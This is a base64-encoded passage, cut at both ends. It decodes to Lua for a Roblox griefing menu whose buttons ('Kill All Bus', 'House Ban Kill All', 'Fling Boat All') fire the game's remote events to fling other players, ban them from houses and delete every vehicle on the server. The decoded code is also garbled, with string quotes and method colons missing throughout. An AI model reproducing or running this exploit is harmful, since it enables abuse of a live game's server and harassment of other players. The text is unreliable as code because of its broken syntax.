Wl0Rm9yQ2hpbGQoMUNhMXIpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChBbGwgdmVoaWNsZXMgd2VyZSBkZWxldGVkISkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgYnJlYWsgIAogICAgICAgICAgICAgICAgZWxzZSAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGltZSA9IHRpY2soKSAgMzUKICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbGF0ZXJhbE9mZnNldCA9IG1hdGguc2luKHRpbWUpICAxMCAgLS0gRmFzdCBsYXRlcmFsIG1vdmVtZW50ICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBmcm9udEJhY2tPZmZzZXQgPSBtYXRoLmNvcyh0aW1lKSAgMjAgIC0tIEZyb250YmFjayBtb3ZlbWVudAogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnVzID0gR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBpZiBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBidXNTZXRQcmltYXJ5UGFydENGcmFtZSh0YXJnZXRSb290LkNGcmFtZSAgQ0ZyYW1lLm5ldygwLCAwLCBmcm9udEJhY2tPZmZzZXQpKSAgCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZCAgCiAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkV2FpdCgpICAKICAgIGVuZAogICAgCiAgICBpZiBjYWxsYmFjayB0aGVuCiAgICAgICAgY2FsbGJhY2soKQogICAgZW5kCmVuZCAgCgpsb2NhbCBmdW5jdGlvbiBTdGFydEtpbGxCdXMocGxheWVyTmFtZSwgY2FsbGJhY2spCiAgICBsb2NhbCBzZWxlY3RlZFBsYXllck5hbWUgPSBwbGF5ZXJOYW1lCgogICAgbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllciAgCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZFdhaXQoKSAgCiAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpICAKCiAgICBvcmlnaW5hbFBvc2l0aW9uID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUgIAoKICAgIGxvY2FsIGJ1cyA9IEdldEJ1cygpICAKCiAgICBpZiBub3QgYnVzIHRoZW4gIAogICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKSAgCiAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgIGxvY2FsIHJlbW90ZUV2ZW50ID0gUmVwbGljYXRlZFN0b3JhZ2VGaW5kRmlyc3RDaGlsZChSRSkgIAogICAgICAgIGlmIHJlbW90ZUV2ZW50IGFuZCByZW1vdGVFdmVudEZpbmRGaXJzdENoaWxkKDFDYTFyKSB0aGVuICAKICAgICAgICAgICAgcmVtb3RlRXZlbnRbMUNhMXJdRmlyZVNlcnZlcihQaWNraW5nQ2FyLCBTY2hvb2xCdXMpICAKICAgICAgICBlbmQgIAogICAgICAgIHRhc2sud2FpdCgxKSAgCiAgICAgICAgYnVzID0gR2V0QnVzKCkgIAogICAgZW5kICAKCiAgICBpZiBidXMgdGhlbiAgCiAgICAgICAgbG9jYWwgc2VhdCA9IGJ1c0ZpbmRGaXJzdENoaWxkKEJvZHkpIGFuZCBidXMuQm9keUZpbmRGaXJzdENoaWxkKFZlaGljbGVTZWF0KSAgCiAgICAgICAgaWYgc2VhdCBhbmQgY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKSBhbmQgbm90IGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgdGhlbiAgCiAgICAgICAgICAgIHJlcGVhdCAgCiAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IHNlYXQuQ0ZyYW1lICBDRnJhbWUubmV3KDAsIDIsIDApICAKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpICAKICAgICAgICAgICAgdW50aWwgY2hhcmFjdGVyLkh1bWFub2lkLlNpdCBvciBub3QgYnVzLlBhcmVudCAgCiAgICAgICAgZW5kICAKICAgIGVuZCAgCgogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIFRyYWNrUGxheWVyKHNlbGVjdGVkUGxheWVyTmFtZSwgY2FsbGJhY2spCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gUGVyZm9ybUFjdGlvbkZvckFsbFBsYXllcnMocGxheWVycykKICAgIGlmICNwbGF5ZXJzID09IDAgdGhlbgogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgcGxheWVyID0gdGFibGUucmVtb3ZlKHBsYXllcnMsIDEpCiAgICBpZiBwbGF5ZXIgfj0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgU3RhcnRLaWxsQnVzKHBsYXllci5OYW1lLCBmdW5jdGlvbigpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIFBlcmZvcm1BY3Rpb25Gb3JBbGxQbGF5ZXJzKHBsYXllcnMpCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIFBlcmZvcm1BY3Rpb25Gb3JBbGxQbGF5ZXJzKHBsYXllcnMpIC0tIFNraXAgc2VsZiBhbmQgbW92ZSB0byB0aGUgbmV4dAogICAgZW5kCmVuZAoKUGVyZm9ybUFjdGlvbkZvckFsbFBsYXllcnMoUGxheWVyc0dldFBsYXllcnMoKSkKICAgIGVuZAp9KQpwcmludChLaWxsIEFsbCBCdXMgYnV0dG9uIGNyZWF0ZWQpCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gSG91c2UgQmFuIEtpbGwgQWxsLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkKbG9jYWwgUGxheWVycyA9IGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSkKCgpsb2NhbCBmdW5jdGlvbiBleGVjdXRlU2NyaXB0Rm9yUGxheWVyKHRhcmdldFBsYXllcikKICAgIGxvY2FsIFBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgQmFja3BhY2sgPSBQbGF5ZXIuQmFja3BhY2sKICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgbG9jYWwgUm9vdFBhcnQgPSBDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgbG9jYWwgSG91c2VzID0gZ2FtZS5Xb3Jrc3BhY2VGaW5kRmlyc3RDaGlsZCgwMDFfTG90cykKICAgIGxvY2FsIE9sZFBvcyA9IFJvb3RQYXJ0LkNGcmFtZQogICAgbG9jYWwgQW5nbGVzID0gMAogICAgbG9jYWwgVmVoaWNsZXMgPSBXb3Jrc3BhY2UuVmVoaWNsZXMKICAgIGxvY2FsIFBvcwoKCiAgICBmdW5jdGlvbiBDaGVjaygpCiAgICAgICAgaWYgUGxheWVyIGFuZCBDaGFyYWN0ZXIgYW5kIEh1bWFub2lkIGFuZCBSb290UGFydCBhbmQgVmVoaWNsZXMgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKCgogICAgaWYgQ2hlY2soKSB0aGVuCiAgICAgICAgbG9jYWwgSG91c2UgPSBIb3VzZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uSG91c2UpCiAgICAgICAgaWYgbm90IEhvdXNlIHRoZW4KICAgICAgICAgICAgbG9jYWwgZW1wdHlIb3VzZQogICAgICAgICAgICBmb3IgXywgTG90IGluIHBhaXJzKEhvdXNlc0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBMb3QuTmFtZSA9PSBGb3IgU2FsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG51bSBpbiBwYWlycyhMb3RHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBudW1Jc0EoTnVtYmVyVmFsdWUpIGFuZCBudW0uTmFtZSA9PSBOdW1iZXIgYW5kIG51bS5WYWx1ZSAgMjUgYW5kIG51bS5WYWx1ZSAgMTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW1wdHlIb3VzZSA9IExvdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgoKICAgICAgICAgICAgbG9jYWwgQnV5RGV0ZWN0b3IgPSBlbXB0eUhvdXNlRmluZEZpcnN0Q2hpbGQoQnV5SG91c2UpCiAgICAgICAgICAgIFBvcyA9IEJ1eURldGVjdG9yLlBvc2l0aW9uCiAgICAgICAgICAgIGlmIEJ1eURldGVjdG9yIGFuZCBCdXlEZXRlY3RvcklzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gQnV5RGV0ZWN0b3IuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgLTYsIDApCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgbG9jYWwgQ2xpY2tEZXRlY3RvciA9IEJ1eURldGVjdG9yRmluZEZpcnN0Q2hpbGQoQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgIGlmIENsaWNrRGV0ZWN0b3IgdGhlbgogICAgICAgICAgICAgICAgICAgIGZpcmVjbGlja2RldGVjdG9yKENsaWNrRGV0ZWN0b3IpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgoKICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgIGxvY2FsIFByZUhvdXNlID0gSG91c2VzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gSG91c2UpCiAgICAgICAgaWYgUHJlSG91c2UgdGhlbgogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBsb2NhbCBOdW1iZXIKICAgICAgICAgICAgZm9yIGksIHggaW4gcGFpcnMoUHJlSG91c2VHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgeC5OYW1lID09IE51bWJlciBhbmQgeElzQShOdW1iZXJWYWx1ZSkgdGhlbgogICAgICAgICAgICAgICAgICAgIE51bWJlciA9IHgKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUdldHRpbjFnSG91czFlKUZpcmVTZXJ2ZXIoUGlja2luZ0N1c3RvbUhvdXNlLCAwNDlfSG91c2UsIE51bWJlci5WYWx1ZSkKICAgICAgICBlbmQKCgogICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLkNhcikKICAgICAgICBpZiBub3QgUENhciB0aGVuCiAgICAgICAgICAgIGlmIENoZWNrKCkgdGhlbgogICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIoUGlja2luZ0NhciwgU2Nob29sQnVzKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGxvY2FsIFBDYXIgPSBWZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi5DYXIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXJGaW5kRmlyc3RDaGlsZChCb2R5KSBhbmQgUENhci5Cb2R5RmluZEZpcnN0Q2hpbGQoVmVoaWNsZVNlYXQpCiAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4KICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKQogICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKCiAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uQ2FyKQogICAgICAgIGlmIFBDYXIgdGhlbgogICAgICAgICAgICBpZiBub3QgSHVtYW5vaWQuU2l0IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIFNlYXQgPSBQQ2FyRmluZEZpcnN0Q2hpbGQoQm9keSkgYW5kIFBDYXIuQm9keUZpbmRGaXJzdENoaWxkKFZlaGljbGVTZWF0KQogICAgICAgICAgICAgICAgaWYgU2VhdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IFNlYXQuQ0ZyYW1lICBDRnJhbWUubmV3KDAsIG1hdGgucmFuZG9tKC0xLCAxKSwgMCkKICAgICAgICAgICAgICAgICAgICB1bnRpbCBIdW1hbm9pZC5TaXQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCgogICAgICAgICAgICBsb2NhbCBUYXJnZXQgPSB0YXJnZXRQbGF5ZXIKICAgICAgICAgICAgbG9jYWwgVGFyZ2V0QyA9IFRhcmdldC5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgVGFyZ2V0SCA9IFRhcmdldENGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICAgICAgICAgIGxvY2FsIFRhcmdldFJQID0gVGFyZ2V0Q0ZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgIGlmIFRhcmdldEMgYW5kIFRhcmdldEggYW5kIFRhcmdldFJQIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBUYXJnZXRILlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm90IFRhcmdldEguU2l0IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEZsaW5nID0gZnVuY3Rpb24odGFyZ2V0LCBwb3MsIGFuZ2xlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUENhclNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcodGFyZ2V0LlBvc2l0aW9uKSAgcG9zICBhbmdsZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIEFuZ2xlcyA9IEFuZ2xlcyArIDEwMAogICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDIuMjUsIDEuNSwgLTIuMjUpICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KC0yLjI1LCAtMS41LCAyLjI1KSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAgVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlICAxLjEwLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBIb3VzZSA9IEhvdXNlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi5Ib3VzZSkKICAgICAgICAgICAgICAgICAgICBQQ2FyU2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhIb3VzZS5Ib3VzZVNwYXduUG9zaXRpb24uUG9zaXRpb24pKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmVnaW9uID0gUmVnaW9uMy5uZXcoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gVmVjdG9yMy5uZXcoMzAsMzAsMzApLCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygzMCwzMCwzMCkpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGFydHNJblJlZ2lvbiA9IHdvcmtzcGFjZUZpbmRQYXJ0c0luUmVnaW9uMyhyZWdpb24sIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKHBhcnRzSW5SZWdpb24pIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSBIdW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKUZpbmRGaXJzdENoaWxkKHYuUGFyZW50Lk5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IEJhblBsYXllckZyb21Ib3VzZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFszXSA9IHYuUGFyZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxUGxheWUxclRyaWdnZTFyRXZlbjF0KUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKCiAgICAtLSBEZWxldGUgdmVoaWNsZQogICAgbG9jYWwgZGVsZXRlQXJncyA9IHsKICAgICAgICBbMV0gPSBEZWxldGVBbGxWZWhpY2xlcwogICAgfQogICAgUmVwbGljYXRlZFN0b3JhZ2VXYWl0Rm9yQ2hpbGQoUkUpV2FpdEZvckNoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIodW5wYWNrKGRlbGV0ZUFyZ3MpKQplbmQKCgotLSBJdGVyYXRlIG92ZXIgYWxsIHBsYXllcnMgb24gdGhlIG1hcApmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgZXhlY3V0ZVNjcmlwdEZvclBsYXllcihwbGF5ZXIpCiAgICAgICB0YXNrLndhaXQoMikKICAgIGVuZAplbmQKICAgIGVuZAp9KQpwcmludChIb3VzZSBCYW4ga2lsbCBBbGwgYnV0dG9uIGNyZWF0ZWQpCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmxpbmcgQm9hdCBBbGwsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgbG9jYWwgUm9vdFBhcnQgPSBDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgbG9jYWwgVmVoaWNsZXMgPSBnYW1lLldvcmtzcGFjZUZpbmRGaXJzdENoaWxkKFZlaGljbGVzKQogICAgbG9jYWwgT2xkUG9zID0gUm9vdFBhcnQuQ0ZyYW1lCiAgICBsb2NhbCBBbmdsZXMgPSAwCiAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uQ2FyKQogICAgCiAgICAtLSBJZiBubyBjYXIsIGNyZWF0ZSBvbmUKICAgICAgICAgICAgaWYgbm90IFBDYXIgdGhlbiAgCiAgICAgICAgICAgICAgICBpZiBSb290UGFydCB0aGVuICAKICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE3NTQsIC0yLCA1OCkgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2ExcilGaXJlU2VydmVyKFBpY2tpbmdCb2F0LCBNaWxpdGFyeUJvYXRGcmVlKSAgCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgICAgICAgICAgICAgIFBDYXIgPSBWZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi5DYXIpICAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXJGaW5kRmlyc3RDaGlsZChCb2R5KSBhbmQgUENhci5Cb2R5RmluZEZpcnN0Q2hpbGQoVmVoaWNsZVNlYXQpICAKICAgICAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdCAgCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFBDYXIgPSBWZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi5DYXIpICAKICAgICAgCiAgICAgICAgICAgIC0tIElmIHRoZSBjYXIgZXhpc3RzLCB0ZWxlcG9ydCB0byB0aGUgc2VhdCBpZiBuZWNlc3NhcnkKICAgICAgICAgICAgaWYgUENhciB0aGVuICAKICAgICAgICAgICAgICAgIGlmIG5vdCBIdW1hbm9pZC5TaXQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXJGaW5kRmlyc3RDaGlsZChCb2R5KSBhbmQgUENhci5Cb2R5RmluZEZpcnN0Q2hpbGQoVmVoaWNsZVNlYXQpICAKICAgICAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdCAgCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBBZGQgQm9keUd5cm8gdG8gdGhlIGNhciBmb3IgbW92ZW1lbnQgY29udHJvbAogICAgICAgICAgICBsb2NhbCBTcGluR3lybyA9IEluc3RhbmNlLm5ldyhCb2R5R3lybykgIAogICAgICAgICAgICBTcGluR3lyby5QYXJlbnQgPSBQQ2FyLlByaW1hcnlQYXJ0ICAKICAgICAgICAgICAgU3Bpbkd5cm8uTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoMWU3LCAxZTcsIDFlNykgIAogICAgICAgICAgICBTcGluR3lyby5QID0gMWU3ICAKICAgICAgICAgICAgU3Bpbkd5cm8uQ0ZyYW1lID0gUENhci5QcmltYXJ5UGFydC5DRnJhbWUgIENGcmFtZS5BbmdsZXMoMCwgbWF0aC5yYWQoOTApLCAwKSAgCiAgICAgIAogICAgICAgICAgICAtLSBGbGluZyBmdW5jdGlvbiBmb3IgZWFjaCBwbGF5ZXIgZm9yIDMgc2Vjb25kcwogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBmbGluZ1BsYXllcihUYXJnZXRDLCBUYXJnZXRSUCwgVGFyZ2V0SCkKICAgIEFuZ2xlcyA9IDAgIAogICAgICAgICAgICAgICAgbG9jYWwgZW5kVGltZSA9IHRpY2soK